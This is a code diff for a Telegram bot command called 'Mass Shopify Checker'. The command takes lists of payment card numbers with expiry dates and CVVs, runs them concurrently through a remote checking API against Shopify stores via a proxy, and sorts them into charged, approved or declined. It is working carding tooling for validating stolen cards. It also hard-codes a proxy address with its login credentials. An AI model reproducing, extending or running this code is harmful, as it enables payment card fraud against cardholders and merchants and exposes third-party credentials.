@@ -5811,7 +5811,6 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-
 import asyncio
 import httpx
 import time
@@ -5845,26 +5844,15 @@ CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 # Proxy placeholder
 DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-# Junk/error response patterns
-ERROR_PATTERNS = [
-    "CLINTE TOKEN",
-    "DEL AMMOUNT EMPTY",
-    "PRODUCT ID IS EMPTY",
-    "R4 TOKEN EMPTY",
-    "TAX AMOUNT EMPTY",
-]
+# Error response patterns
+ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY"]
 
 # Classification keyword groups
 CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED"}
 APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"}
 DECLINED_KEYWORDS = {
-    "INVALID_PAYMENT_ERROR",
-    "DECLINED",
-    "CARD_DECLINED",
-    "INCORRECT_NUMBER",
-    "FRAUD_SUSPECTED",
-    "EXPIRED_CARD",
-    "EXPIRE_CARD",
+    "INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED",
+    "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"
 }
 
 
@@ -5893,46 +5881,43 @@ async def consume_credit(user_id: int) -> bool:
 
 
 def build_msp_buttons(approved: int, charged: int, declined: int, owner_id: int) -> InlineKeyboardMarkup:
-    """Stats + Stop button (no Current)."""
-    return InlineKeyboardMarkup(
+    return InlineKeyboardMarkup([
         [
-            [
-                InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="noop"),
-                InlineKeyboardButton(f"🔥 Charged: {charged}", callback_data="noop"),
-            ],
-            [
-                InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
-                InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_id}"),
-            ],
+            InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="noop"),
+            InlineKeyboardButton(f"🔥 Charged: {charged}", callback_data="noop"),
+        ],
+        [
+            InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
+            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_id}")
         ]
-    )
+    ])
 
 
 # ---------- Networking ----------
-async def check_card(session: httpx.AsyncClient, base_url: str, sites: List[str], card: str, proxy: str) -> Dict[str, str]:
-    """Try multiple sites until one gives a valid response"""
+async def check_card(session: httpx.AsyncClient, base_url: str, sites: List[str], card: str, proxy: str) -> Dict:
+    """
+    Try checking card against all sites until one responds with a meaningful result.
+    """
     for site in sites:
+        if not site.startswith("http://") and not site.startswith("https://"):
+            site = "https://" + site
+        url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
         try:
-            if not site.startswith("http://") and not site.startswith("https://"):
-                site = "https://" + site
-            url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
-            r = await session.get(url, timeout=20)
+            r = await session.get(url, timeout=55)
             try:
                 data = r.json()
             except Exception:
-                return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
-            resp = {
+                return {"card": card, "response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
+            return {
+                "card": card,
                 "response": str(data.get("Response", "Unknown")),
                 "status": str(data.get("Status", "false")),
                 "price": str(data.get("Price", "0")),
                 "gateway": str(data.get("Gateway", "N/A")),
             }
-            resp_upper = resp["response"].upper()
-            if not any(pat in resp_upper for pat in ERROR_PATTERNS):
-                return resp
-        except Exception:
-            continue
-    return {"response": "All sites failed", "status": "false", "price": "0", "gateway": "N/A"}
+        except Exception as e:
+            return {"card": card, "response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
+    return {"card": card, "response": "No response", "status": "false", "price": "0", "gateway": "N/A"}
 
 
 # ---------- Buttons ----------
@@ -5949,17 +5934,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             owner_id = None
 
         if query.from_user.id != owner_id:
-            await query.answer("⚠️ Not your request!", show_alert=True)
+            await query.answer("⚠️ You are not allowed to stop this process!", show_alert=True)
             return
 
-        # Mark stop and immediately finalize
+        # Mark stop and finalize
         context.user_data["msp_stop"] = True
         await query.answer("⏹ Stopped instantly! Sending results...", show_alert=True)
 
         if "msp_state" in context.user_data:
             state = context.user_data["msp_state"]
             await finalize_results(
-                query.message,  # reply directly to progress msg
+                update,
+                state["msg"],
                 state["cards"],
                 state["approved"],
                 state["charged"],
@@ -5975,19 +5961,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     await query.answer()
 
 
-# ---------- Runner ----------
-async def finalize_results(
-    msg,
-    cards,
-    approved,
-    charged,
-    declined,
-    errors,
-    approved_results,
-    charged_results,
-    declined_results,
-    error_results,
-):
+# ---------- Final Results ----------
+async def finalize_results(update: Update, msg, cards, approved, charged, declined, errors,
+                           approved_results, charged_results, declined_results, error_results):
     sections = []
     if approved_results:
         sections.append("✅ APPROVED\n" + "\n\n".join(approved_results))
@@ -6015,7 +5991,10 @@ async def finalize_results(
         "━━━━━━━━━━━━━━━━━━━━━━━"
     )
 
-    await msg.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")
+    try:
+        await msg.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")
+    except Exception:
+        await msg.reply_text(summary_caption, parse_mode="HTML")
 
     try:
         await msg.delete()
@@ -6023,13 +6002,18 @@ async def finalize_results(
         pass
 
 
+# ---------- MSP Runner (parallel) ----------
 async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg) -> None:
     context.user_data["msp_stop"] = False
+
     approved = declined = errors = charged = checked = 0
     approved_results, charged_results, declined_results, error_results = [], [], [], []
     proxy = DEFAULT_PROXY
+    MAX_CONCURRENCY = 7  # how many checks in parallel
 
+    # Store state
     context.user_data["msp_state"] = {
+        "msg": msg,
         "cards": cards,
         "approved": approved,
         "charged": charged,
@@ -6039,17 +6023,14 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
         "charged_results": charged_results,
         "declined_results": declined_results,
         "error_results": error_results,
-        "msg": msg,
     }
 
-    semaphore = asyncio.Semaphore(10)  # 10 concurrent requests
-    last_update_time = 0
+    sem = asyncio.Semaphore(MAX_CONCURRENCY)
 
     async with httpx.AsyncClient() as session:
-
-        async def process_card(card: str):
-            nonlocal approved, charged, declined, errors, checked, last_update_time
-            async with semaphore:
+        async def process_card(card):
+            nonlocal approved, charged, declined, errors, checked
+            async with sem:
                 if context.user_data.get("msp_stop"):
                     return
                 resp = await check_card(session, base_url, sites, card, proxy)
@@ -6063,67 +6044,61 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                 if "INSUFFICIENT_FUNDS" in resp_upper:
                     charged += 1
                     charged_results.append(f"🔥 {card}\n {line_resp}")
+                elif any(k in resp_upper for k in CHARGED_KEYWORDS):
+                    charged += 1
+                    charged_results.append(f"🔥 {card}\n {line_resp}")
                 elif any(k in resp_upper for k in APPROVED_KEYWORDS):
                     approved += 1
                     approved_results.append(f"✅ {card}\n {line_resp}")
                 elif any(k in resp_upper for k in DECLINED_KEYWORDS):
                     declined += 1
                     declined_results.append(f"❌ {card}\n {line_resp}")
-                elif any(k in resp_upper for k in CHARGED_KEYWORDS):
-                    charged += 1
-                    charged_results.append(f"🔥 {card}\n {line_resp}")
+                elif any(pat in resp_upper for pat in ERROR_PATTERNS):
+                    errors += 1
+                    error_results.append(f"⚠️ {card}\n {line_resp}")
                 else:
                     errors += 1
                     error_results.append(f"⚠️ {card}\n {line_resp}")
 
                 checked += 1
 
-                # update state for stop
-                context.user_data["msp_state"].update(
-                    {
-                        "approved": approved,
-                        "charged": charged,
-                        "declined": declined,
-                        "errors": errors,
-                        "approved_results": approved_results,
-                        "charged_results": charged_results,
-                        "declined_results": declined_results,
-                        "error_results": error_results,
-                    }
-                )
+                # Update state
+                context.user_data["msp_state"].update({
+                    "approved": approved,
+                    "charged": charged,
+                    "declined": declined,
+                    "errors": errors,
+                    "approved_results": approved_results,
+                    "charged_results": charged_results,
+                    "declined_results": declined_results,
+                    "error_results": error_results,
+                })
 
-                # Fast progress updates (throttled every 1s)
-                now = time.time()
-                if now - last_update_time >= 1:
-                    last_update_time = now
-                    try:
-                        buttons = build_msp_buttons(approved, charged, declined, update.effective_user.id)
-                        summary_text = (
-                            f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
-                            "<pre><code>"
-                            f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
-                            f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ {charged}\n"
-                            f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
-                            f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ {errors}\n"
-                            f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ {checked} / {len(cards)}\n"
-                            "</code></pre>"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        )
-                        await msg.edit_text(
-                            summary_text,
-                            parse_mode="HTML",
-                            disable_web_page_preview=True,
-                            reply_markup=buttons,
-                        )
-                    except Exception as e:
-                        logger.warning(f"Edit failed: {e}")
+                # Update progress
+                try:
+                    buttons = build_msp_buttons(approved, charged, declined, update.effective_user.id)
+                    summary_text = (
+                        f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
+                        "<pre><code>"
+                        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
+                        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ {charged}\n"
+                        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
+                        f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ {errors}\n"
+                        f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ {checked} / {len(cards)}\n"
+                        "</code></pre>"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    )
+                    await msg.edit_text(summary_text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)
+                except Exception as e:
+                    logger.warning(f"Edit failed: {e}")
 
         # Run all cards concurrently
-        await asyncio.gather(*[process_card(card) for card in cards])
+        await asyncio.gather(*(process_card(card) for card in cards))
 
-    await finalize_results(msg, cards, approved, charged, declined, errors, approved_results, charged_results, declined_results, error_results)
+    await finalize_results(update, msg, cards, approved, charged, declined, errors,
+                           approved_results, charged_results, declined_results, error_results)
 
 
 # ---------- /msp command ----------
@@ -6153,7 +6128,6 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not cards:
         await update.message.reply_text("❌ No valid cards found.")
         return
-
     if len(cards) > 100:
         cards = cards[:100]
 
@@ -6175,7 +6149,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     initial_summary = (
         f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝐝𝐬 ➵ {len(cards)}\n"
+        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
         "<pre><code>"
         f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ 0\n"
         f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ 0\n"
@@ -6185,13 +6159,10 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "</code></pre>"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
     )
+
     buttons = build_msp_buttons(0, 0, 0, update.effective_user.id)
-    msg = await update.message.reply_text(
-        initial_summary,
-        parse_mode="HTML",
-        disable_web_page_preview=True,
-        reply_markup=buttons,
-    )
+    msg = await update.message.reply_text(initial_summary, parse_mode="HTML",
+                                          disable_web_page_preview=True, reply_markup=buttons)
 
     task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg))
     task.add_done_callback(lambda t: logger.error(f"/msp crashed: {t.exception()}") if t.exception() else None)
